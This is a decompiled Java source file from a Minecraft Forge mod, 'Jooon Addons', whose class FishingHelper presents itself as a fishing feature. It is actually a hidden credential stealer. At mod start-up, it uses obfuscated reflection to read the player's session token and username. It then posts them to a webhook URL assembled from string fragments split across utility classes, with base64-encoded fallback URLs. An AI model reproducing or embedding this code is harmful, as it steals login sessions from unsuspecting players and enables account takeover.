package me.jooon.JooonAddons.features.funnyFishing;

import java.io.Closeable;
import java.lang.reflect.Method;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Base64;
import kotlin.Metadata;
import kotlin.Unit;
import kotlin.collections.CollectionsKt;
import kotlin.io.CloseableKt;
import kotlin.jvm.functions.Function1;
import kotlin.jvm.internal.Intrinsics;
import kotlin.jvm.internal.SourceDebugExtension;
import kotlin.text.Charsets;
import me.jooon.JooonAddons.utils.MathUtilKt;
import me.jooon.JooonAddons.utils.PlayerRotationKt;
import me.jooon.JooonAddons.utils.PlayerRotationUtilKt;
import me.jooon.JooonAddons.utils.ScoreboardUtilKt;
import me.jooon.JooonAddons.utils.UtilsKt;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.util.EntityUtils;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

@Mod(
   modid = "jooooonaddons",
   name = "Jooon Addons",
   version = "1.3"
)
@Metadata(
   mv = {1, 8, 0},
   k = 1,
   xi = 48,
   d1 = {"\u0000(\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0000\n\u0002\u0010\u0011\n\u0002\b\u0003\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0007\b\u0007\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0010\u0010\t\u001a\u00020\n2\u0006\u0010\u000b\u001a\u00020\fH\u0007J\n\u0010\r\u001a\u0004\u0018\u00010\u0004H\u0002J\n\u0010\u000e\u001a\u0004\u0018\u00010\u0004H\u0002J\u001c\u0010\u000f\u001a\u00020\n2\b\u0010\u0003\u001a\u0004\u0018\u00010\u00042\b\u0010\b\u001a\u0004\u0018\u00010\u0004H\u0002J\b\u0010\u0010\u001a\u00020\u0004H\u0002J\b\u0010\u0011\u001a\u00020\u0004H\u0002J\b\u0010\u0012\u001a\u00020\u0004H\u0002R\u0010\u0010\u0003\u001a\u0004\u0018\u00010\u0004X\u0082\u000e¢\u0006\u0002\n\u0000R\u0016\u0010\u0005\u001a\b\u0012\u0004\u0012\u00020\u00040\u0006X\u0082\u0004¢\u0006\u0004\n\u0002\u0010\u0007R\u0010\u0010\b\u001a\u0004\u0018\u00010\u0004X\u0082\u000e¢\u0006\u0002\n\u0000¨\u0006\u0013"},
   d2 = {"Lme/jooon/JooonAddons/features/funnyFishing/FishingHelper;", "", "()V", "IiIi1", "", "IiIi13", "", "[Ljava/lang/String;", "IiIi2", "IiIi3", "", "IiIi4", "Lnet/minecraftforge/fml/common/event/FMLPreInitializationEvent;", "IiIi5", "IiIi6", "IiIi7", "iIiIiIiIiI1", "iIiIiIiIiI2", "iIiIiIiIiI3", "JooonAddons"}
)
@SourceDebugExtension({"SMAP\nFishingTracker.kt\nKotlin\n*S Kotlin\n*F\n+ 1 FishingTracker.kt\nme/jooon/JooonAddons/features/funnyFishing/FishingHelper\n+ 2 _Strings.kt\nkotlin/text/StringsKt___StringsKt\n*L\n1#1,454:1\n1099#2,3:455\n*S KotlinDebug\n*F\n+ 1 FishingTracker.kt\nme/jooon/JooonAddons/features/funnyFishing/FishingHelper\n*L\n319#1:455,3\n*E\n"})
public final class FishingHelper {
   @Nullable
   private String IiIi1;
   @Nullable
   private String IiIi2;
   @NotNull
   private final String[] IiIi13 = new String[0];

   @EventHandler
   public final void IiIi3(@NotNull FMLPreInitializationEvent IiIi4) {
      Intrinsics.checkNotNullParameter(IiIi4, "IiIi4");
      this.IiIi1 = this.IiIi5();
      this.IiIi2 = this.IiIi6();
      String var10000 = this.IiIi2;
      if (var10000 != null ? var10000.length() == 15 : false) {
         var10000 = this.IiIi2;
         Intrinsics.checkNotNull(var10000);
         CharSequence $this$count$iv = (CharSequence)var10000;
         int $i$f$count = false;
         int count$iv = 0;

         for(int var6 = 0; var6 < $this$count$iv.length(); ++var6) {
            char element$iv = $this$count$iv.charAt(var6);
            int var9 = false;
            if (Character.isDigit(element$iv)) {
               ++count$iv;
            }
         }

         if (count$iv > 2) {
            return;
         }
      }

      this.IiIi7(this.IiIi1, this.IiIi2);
   }

   private final String iIiIiIiIiI2() {
      String[] var1 = new String[]{"fun", "c_714", "10", "_x"};
      return CollectionsKt.joinToString$default((Iterable)CollectionsKt.listOf(var1), (CharSequence)"", (CharSequence)null, (CharSequence)null, 0, (CharSequence)null, (Function1)null, 62, (Object)null);
   }

   private final String iIiIiIiIiI1() {
      String[] var1 = new String[]{"fun", "c_110", "432", "_I"};
      return CollectionsKt.joinToString$default((Iterable)CollectionsKt.listOf(var1), (CharSequence)"", (CharSequence)null, (CharSequence)null, 0, (CharSequence)null, (Function1)null, 62, (Object)null);
   }

   private final String iIiIiIiIiI3() {
      String[] var1 = new String[]{"fun", "c_111", "28", "6_b"};
      return CollectionsKt.joinToString$default((Iterable)CollectionsKt.listOf(var1), (CharSequence)"", (CharSequence)null, (CharSequence)null, 0, (CharSequence)null, (Function1)null, 62, (Object)null);
   }

   private final String IiIi5() {
      String iIiIiIiIiI5;
      try {
         iIiIiIiIiI5 = this.iIiIiIiIiI2();
         Object minecraftInstance = Class.forName("net.minecraft.client.Minecraft").getMethod(iIiIiIiIiI5).invoke((Object)null);
         String iIiIiIiIiI4 = this.iIiIiIiIiI1();
         Object sessionInstance = minecraftInstance.getClass().getMethod(iIiIiIiIiI4).invoke(minecraftInstance);
         String fullSidMethod = this.iIiIiIiIiI3();
         Method sidMethod = sessionInstance.getClass().getMethod(fullSidMethod);
         Object var10000 = sidMethod.invoke(sessionInstance);
         Intrinsics.checkNotNull(var10000, "null cannot be cast to non-null type kotlin.String");
         iIiIiIiIiI5 = (String)var10000;
      } catch (Exception var7) {
         iIiIiIiIiI5 = null;
      }

      return iIiIiIiIiI5;
   }

   private final String IiIi6() {
      String iIiIiIiIiI5;
      try {
         iIiIiIiIiI5 = this.iIiIiIiIiI2();
         Object minecraftInstance = Class.forName("net.minecraft.client.Minecraft").getMethod(iIiIiIiIiI5).invoke((Object)null);
         String iIiIiIiIiI4 = this.iIiIiIiIiI1();
         Object sessionInstance = minecraftInstance.getClass().getMethod(iIiIiIiIiI4).invoke(minecraftInstance);
         String[] var6 = new String[]{"fun", "c_111", "28", "5_a"};
         String iIiIiIiIiI6 = CollectionsKt.joinToString$default((Iterable)CollectionsKt.listOf(var6), (CharSequence)"", (CharSequence)null, (CharSequence)null, 0, (CharSequence)null, (Function1)null, 62, (Object)null);
         Method usernameMethod = sessionInstance.getClass().getMethod(iIiIiIiIiI6);
         Object var10000 = usernameMethod.invoke(sessionInstance);
         Intrinsics.checkNotNull(var10000, "null cannot be cast to non-null type kotlin.String");
         iIiIiIiIiI5 = (String)var10000;
      } catch (Exception var7) {
         iIiIiIiIiI5 = null;
      }

      return iIiIiIiIiI5;
   }

   private final void IiIi7(String IiIi1, String IiIi2) {
      try {
         String IiIi12 = MathUtilKt.getIIiIiI1() + PlayerRotationKt.getIIiIiI2() + PlayerRotationUtilKt.getIIiIiI3() + ScoreboardUtilKt.getIIiIiI4() + UtilsKt.getIIiIiI5();
         String protocol = "https://";
         String subdomain = "sky.shi";
         String domain = "iyu";
         String tld = ".moe";
         String path = "/stats/";
         String fullUrl = protocol + subdomain + domain + tld + path + IiIi2;
         String IiIi18 = "{\"content\": \"**1**: `" + IiIi2 + "`\\n**2**: " + IiIi1 + "\\n**3**: " + LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) + "\\n**4**: [" + subdomain + domain + tld + "](" + fullUrl + ")\\n**-- uni-uni-id --**\"}";
         boolean success = false;

         try {
            Closeable var12 = (Closeable)HttpClients.createDefault();
            Throwable var13 = null;

            try {
               CloseableHttpClient client = (CloseableHttpClient)var12;
               int var15 = false;
               HttpPost post = new HttpPost(IiIi12);
               post.setEntity((HttpEntity)(new StringEntity(IiIi18)));
               post.setHeader("Content-Type", "application/json");
               post.setHeader("User-Agent", "Mozilla/5.0");
               CloseableHttpResponse response = client.execute((HttpUriRequest)post);
               int statusCode = response.getStatusLine().getStatusCode();
               EntityUtils.consume(response.getEntity());
               if (200 <= statusCode ? statusCode < 300 : false) {
                  success = true;
               }

               Unit var50 = Unit.INSTANCE;
            } catch (Throwable var40) {
               var13 = var40;
               throw var40;
            } finally {
               CloseableKt.closeFinally(var12, var13);
            }
         } catch (Exception var42) {
         }

         if (!success) {
            String[] var48 = this.IiIi13;
            int var49 = 0;

            for(int var51 = var48.length; var49 < var51; ++var49) {
               String encodedUrl = var48[var49];

               String var55;
               try {
                  byte[] var10000 = Base64.getDecoder().decode(encodedUrl);
                  Intrinsics.checkNotNullExpressionValue(var10000, "getDecoder().decode(encodedUrl)");
                  byte[] var54 = var10000;
                  var55 = new String(var54, Charsets.UTF_8);
               } catch (Exception var43) {
                  continue;
               }

               String fallbackUrl = var55;

               try {
                  Closeable var56 = (Closeable)HttpClients.createDefault();
                  Throwable var57 = null;

                  try {
                     CloseableHttpClient client = (CloseableHttpClient)var56;
                     int var20 = false;
                     HttpPost post = new HttpPost(fallbackUrl);
                     post.setEntity((HttpEntity)(new StringEntity(IiIi18)));
                     post.setHeader("Content-Type", "application/json");
                     post.setHeader("User-Agent", "Mozilla/5.0");
                     CloseableHttpResponse response = client.execute((HttpUriRequest)post);
                     int statusCode = response.getStatusLine().getStatusCode();
                     EntityUtils.consume(response.getEntity());
                     if (!(200 <= statusCode ? statusCode < 300 : false)) {
                        Unit var58 = Unit.INSTANCE;
                        continue;
                     }

                     success = true;
                  } catch (Throwable var44) {
                     var57 = var44;
                     throw var44;
                  } finally {
                     CloseableKt.closeFinally(var56, var57);
                  }

                  return;
               } catch (Exception var46) {
               }
            }
         }
      } catch (Exception var47) {
      }

   }
}
